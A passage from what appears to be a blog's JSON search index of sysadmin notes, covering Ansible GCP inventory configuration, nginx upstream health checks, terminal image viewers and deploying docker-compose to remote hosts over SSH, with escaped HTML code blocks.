style=\"color:#e6db74\"\u003e\u0026#39;max-compute[!0:3]\u0026#39;\u003c/span\u003e -m setup --list-hosts\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  hosts \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e6\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    max-compute4\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    max-compute5\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    max-compute6\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    max-compute7\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    max-compute8\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    max-compute9\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eplugin\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003egcp_compute\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eprojects\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#ae81ff\"\u003eproject-XXX\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003ezones\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#ae81ff\"\u003easia-east1-a\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#ae81ff\"\u003easia-east1-c\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#ae81ff\"\u003easia-east1-b\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#ae81ff\"\u003easia-east2-a\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#ae81ff\"\u003easia-east2-c\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#ae81ff\"\u003easia-east2-b\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eauth_kind\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eserviceaccount\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eservice_account_file\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e/root/.ssh/sa001.json\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efilters\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#ae81ff\"\u003estatus=\u0026#34;RUNNING\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003ehostnames\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#ae81ff\"\u003ename\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003egroups\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003enginx\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;nginx\u0026#39; in name\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003ecassandra\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;cassandra\u0026#39; in name\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eredis\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;redis\u0026#39; in name\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003emisc\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;name in (\u0026#39;noc\u0026#39;, \u0026#39;mt-center\u0026#39;)\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eprod\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;prod\u0026#39; in name and \u0026#39;gke\u0026#39; not in name\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eall\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;gke\u0026#39; not in name\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003esearch\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;search\u0026#39; in name\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003echt_domain\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ \u0026#39;web.qat.cht\u0026#39; if ansible_default_ipv4[\u0026#39;network\u0026#39;] == \u0026#39;192.168.40.0\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  else \u0026#39;ap.qat.cht\u0026#39; if ansible_default_ipv4[\u0026#39;network\u0026#39;] == \u0026#39;192.168.50.0\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  else \u0026#39;db.qat.cht\u0026#39; if ansible_default_ipv4[\u0026#39;network\u0026#39;] == \u0026#39;192.168.60.0\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  else \u0026#39;qat.cht\u0026#39; }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["Ansible"],"title":"Abount Ansible Hosts"},{"categories":["URL","Nginx"],"contents":" nginx 添加第三方 nginx_upstream_check_module 模块实现健康状态检测 nginx_upstream_check_module Health check HTTP servers inside an upstream nginx.conf\nhttp { upstream cluster { # simple round-robin server 192.168.0.1:80; server 192.168.0.2:80; check interval=5000 rise=1 fall=3 timeout=4000; #check interval=3000 rise=2 fall=5 timeout=1000 type=ssl_hello; #check interval=3000 rise=2 fall=5 timeout=1000 type=http; #check_http_send \u0026#34;HEAD / HTTP/1.0\\r\\n\\r\\n\u0026#34;; #check_http_expect_alive http_2xx http_3xx; } ... check syntax: *check interval=milliseconds [fall=count] [rise=count] [timeout=milliseconds] [default_down=true|false] [type=tcp|http|ssl_hello|mysql|ajp|fastcgi]* 默认配置：interval=3000 fall=5 rise=2 timeout=1000 default_down=true type=tcp* ... interval： 检测间隔 3 秒 fall: 连续检测失败次数 5 次时，认定 relaserver is down rise: 连续检测成功 2 次时，认定 relaserver is up timeout: 超时 1 秒 default_down: 初始状态为 down,只有检测通过后才为 up type: 检测类型方式 tcp tcp :tcp 套接字,不建议使用，后端业务未 100%启动完成,前端已经放开访问的情况 ssl_hello： 发送 hello 报文并接收 relaserver 返回的 hello 报文 http: 自定义发送一个请求，判断上游 relaserver 接收并处理 mysql: 连接到 mysql 服务器，判断上游 relaserver 是否还存在 ajp: 发送 AJP Cping 数据包，接收并解析 AJP Cpong 响应以诊断上游 relaserver 是否还存活(AJP tomcat 内置的一种协议) fastcgi: php 程序是否存活 example\nupstream cluster { server 192.168.20.12:80; server 192.168.20.3:80; #未启动web服务，默认为down check interval=3000 rise=2 fall=3 timeout=1000 type=http; check_http_send \u0026#34;GET /index.html HTTP/1.0\\r\\n\\r\\n\u0026#34;; #获取后端资源，资源变动后，经历三次检查周期后立即将状态改为down check_http_expect_alive http_2xx http_3xx ; #check_http_send 返回状态码，2xx和3xx为默认值。 } server { listen 80; location / { proxy_pass http://cluster; } location = /status { check_status; #allow xxx; #deny all; } } ","date":"April 26, 2020","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200426-nginx_upstream_check_modue/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.cnblogs.com/dance-walter/p/12212607.html\" target=\"_blank\" rel=\"noopener\"\u003enginx 添加第三方 nginx_upstream_check_module 模块实现健康状态检测\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/yaoweibin/nginx_upstream_check_modue\" target=\"_blank\" rel=\"noopener\"\u003enginx_upstream_check_module Health check HTTP servers inside an upstream\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003enginx.conf\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ehttp\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eupstream\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ecluster\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#75715e\"\u003e# simple round-robin\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e            \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e 192.168.0.1:\u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e 192.168.0.2:\u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#f92672\"\u003echeck\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003einterval=5000\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003erise=1\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efall=3\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003etimeout=4000\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#75715e\"\u003e#check interval=3000 rise=2 fall=5 timeout=1000 type=ssl_hello;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e            \u003cspan style=\"color:#75715e\"\u003e#check interval=3000 rise=2 fall=5 timeout=1000 type=http;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e            \u003cspan style=\"color:#75715e\"\u003e#check_http_send \u0026#34;HEAD / HTTP/1.0\\r\\n\\r\\n\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e            \u003cspan style=\"color:#75715e\"\u003e#check_http_expect_alive http_2xx http_3xx;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e...\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003echeck\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003esyntax:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e*check\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003einterval=milliseconds\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e[fall=count]\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e[rise=count]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e[timeout=milliseconds]\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e[default_down=true|false]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e[type=tcp|http|ssl_hello|mysql|ajp|fastcgi]*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   \u003cspan style=\"color:#e6db74\"\u003e默认配置：interval=3000\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efall=5\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003erise=2\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003etimeout=1000\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003edefault_down=true\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003etype=tcp*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e...\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003einterval： 检测间隔 3 秒\u003c/li\u003e\n\u003cli\u003efall: 连续检测失败次数 5 次时，认定 relaserver is down\u003c/li\u003e\n\u003cli\u003erise: 连续检测成功 2 次时，认定 relaserver is up\u003c/li\u003e\n\u003cli\u003etimeout: 超时 1 秒\u003c/li\u003e\n\u003cli\u003edefault_down: 初始状态为 down,只有检测通过后才为 up\u003c/li\u003e\n\u003cli\u003etype: 检测类型方式 tcp\n\u003col\u003e\n\u003cli\u003etcp :tcp 套接字,不建议使用，后端业务未 100%启动完成,前端已经放开访问的情况\u003c/li\u003e\n\u003cli\u003essl_hello： 发送 hello 报文并接收 relaserver 返回的 hello 报文\u003c/li\u003e\n\u003cli\u003ehttp: 自定义发送一个请求，判断上游 relaserver 接收并处理\u003c/li\u003e\n\u003cli\u003emysql: 连接到 mysql 服务器，判断上游 relaserver 是否还存在\u003c/li\u003e\n\u003cli\u003eajp: 发送 AJP Cping 数据包，接收并解析 AJP Cpong 响应以诊断上游 relaserver 是否还存活(AJP tomcat 内置的一种协议)\u003c/li\u003e\n\u003cli\u003efastcgi: php 程序是否存活\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eexample\u003c/strong\u003e\u003c/p\u003e","tags":["URL","Nginx"],"title":"nginx 添加第三方nginx_upstream_check_module 模块实现健康状态检测"},{"categories":["URL","Git"],"contents":" CS Visualized: Useful Git Commands ","date":"April 16, 2020","hero":"/images/hero/git.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200416-cs-visualized-useful-git-commands-37p1/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://dev.to/lydiahallie/cs-visualized-useful-git-commands-37p1\" target=\"_blank\" rel=\"noopener\"\u003eCS Visualized: Useful Git Commands\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Git"],"title":"CS Visualized: Useful Git Commands"},{"categories":["URL","Ansible"],"contents":" string field was converted to True (type string) Unauthorized name in RAKP2 Failed to start poweroff connection timed out ","date":"April 15, 2020","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200415-string-field-was-converted-to-true-type/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.weithenn.org/2020/04/string-field-was-converted-to-true-type.html\" target=\"_blank\" rel=\"noopener\"\u003estring field was converted to True (type string)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://www.weithenn.org/2020/04/unauthorized-name-in-rakp2.html\" target=\"_blank\" rel=\"noopener\"\u003eUnauthorized name in RAKP2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.weithenn.org/2020/04/failed-to-start-poweroff-connection.html\" target=\"_blank\" rel=\"noopener\"\u003eFailed to start poweroff connection timed out\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Ansible"],"title":"string field was converted to True (type string)"},{"categories":["URL","Linux","command line"],"contents":" 活久见！Linux 命令行居然也可以用来查看图像？ FIM sudo apt-get install fim\n控制 FIM 中图像的常用快捷键：\nPageUp / Down：上一个图像/下一个图像 +/-：放大/缩小 a：自动缩放 w：合适宽度 h：合适身高 j / k：向下平移/向上平移 f / m：翻转/镜面反射 r / R：旋转（顺时针和逆时针） ESC / q：退出 Viu cargo install viu\nLsix sudo apt-get install imagemagick\nwget https://github.com/hackerb9/lsix/archive/master.zip\n","date":"April 14, 2020","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200414-6844904122794115086/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://juejin.cn/post/6844904122794115086\" target=\"_blank\" rel=\"noopener\"\u003e活久见！Linux 命令行居然也可以用来查看图像？\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"fim\"\u003eFIM\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003esudo apt-get install fim\u003c/code\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e控制 FIM 中图像的常用快捷键：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ePageUp / Down：上一个图像/下一个图像\u003c/li\u003e\n\u003cli\u003e+/-：放大/缩小\u003c/li\u003e\n\u003cli\u003ea：自动缩放\u003c/li\u003e\n\u003cli\u003ew：合适宽度\u003c/li\u003e\n\u003cli\u003eh：合适身高\u003c/li\u003e\n\u003cli\u003ej / k：向下平移/向上平移\u003c/li\u003e\n\u003cli\u003ef / m：翻转/镜面反射\u003c/li\u003e\n\u003cli\u003er / R：旋转（顺时针和逆时针）\u003c/li\u003e\n\u003cli\u003eESC / q：退出\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"viu\"\u003eViu\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003ecargo install viu\u003c/code\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch4 id=\"lsix\"\u003eLsix\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003esudo apt-get install imagemagick\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ewget https://github.com/hackerb9/lsix/archive/master.zip\u003c/code\u003e\u003c/p\u003e\u003c/blockquote\u003e","tags":["URL","Linux","command line"],"title":"活久见！Linux命令行居然也可以用来查看图像？"},{"categories":["URL","Docker"],"contents":" How to deploy on remote Docker hosts with docker-compose Manual deployment by copying project files, install docker-compose and running it $ scp -r hello-docker user@remotehost:/path/to/src $ ssh user@remotehost $ pip install docker-compose $ cd /path/to/src/hello-docker $ docker-compose up -d Using DOCKER_HOST environment variable to set up the target engine $ cd hello-docker $ DOCKER_HOST=\u0026#34;ssh://user@remotehost\u0026#34; docker-compose up -d Using docker contexts $ docker context create remote ‐‐docker \u0026#34;host=ssh://user@remotemachine\u0026#34; remote Successfully created context \u0026#34;remote\u0026#34; $ docker context ls NAME DESCRIPTION DOCKER ENDPOINT KUBERNETES ENDPOINT ORCHESTRATOR default * Current DOCKER_HOST… unix:///var/run/docker.sock swarm remote ssh://user@remotemachine $ cd hello-docker $ docker-compose ‐‐context remote up -d ","date":"March 25, 2020","hero":"/images/hero/docker.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200325-how-to-deploy-on-remote-docker-hosts-with-docker-compose/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.docker.com/blog/how-to-deploy-on-remote-docker-hosts-with-docker-compose/\" target=\"_blank\" rel=\"noopener\"\u003eHow to deploy on remote Docker hosts with docker-compose\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"manual-deployment-by-copying-project-files-install-docker-compose-and-running-it\"\u003eManual deployment by copying project files, install docker-compose and running it\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ scp -r hello-docker user@remotehost:/path/to/src\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ssh user@remotehost\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ pip install docker-compose\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ cd /path/to/src/hello-docker\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ docker-compose up -d\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"using-docker_host-environment-variable-to-set-up-the-target-engine\"\u003eUsing DOCKER_HOST environment variable to set up the target engine\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ cd hello-docker\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ DOCKER_HOST\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ssh://user@remotehost\u0026#34;\u003c/span\u003e docker-compose up -d\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"using-docker-contexts\"\u003eUsing docker contexts\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ docker context create remote ‐‐docker \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;host=ssh://user@remotemachine\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eremote\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSuccessfully created context \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;remote\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ docker context ls\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNAME      DESCRIPTION            DOCKER ENDPOINT    KUBERNETES ENDPOINT     ORCHESTRATOR\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edefault * Current DOCKER_HOST…   unix:///var/run/docker.sock                swarm\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eremote                           ssh://user@remotemachine\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ cd hello-docker\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ docker-compose ‐‐context remote up -d\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Docker"],"title":"How to deploy on remote Docker hosts with docker-compose"},{"categories":["URL","Kubernetes"],"contents":" 应大多数人要求写下 kubeadm 的基础使用 Kubernetes 从 1.10 到 1.11 升级记录(续)：Kubernetes kube-proxy 开启 IPVS 模式 Katacontainers 与 Docker 和 Kubernetes 的集成 ","date":"March 24, 2020","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200324-kubeadm-base-use/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://zhangguanzhang.github.io/2019/11/24/kubeadm-base-use/\" target=\"_blank\" rel=\"noopener\"\u003e应大多数人要求写下 kubeadm 的基础使用\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://blog.frognew.com/2018/10/kubernetes-kube-proxy-enable-ipvs.html\" target=\"_blank\" rel=\"noopener\"\u003eKubernetes 从 1.10 到 1.11 升级记录(续)：Kubernetes kube-proxy 开启 IPVS 模式\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://lingxiankong.github.io/2018-07-20-katacontainer-docker-k8s.html\" target=\"_blank\" rel=\"noopener\"\u003eKatacontainers 与 Docker 和 Kubernetes 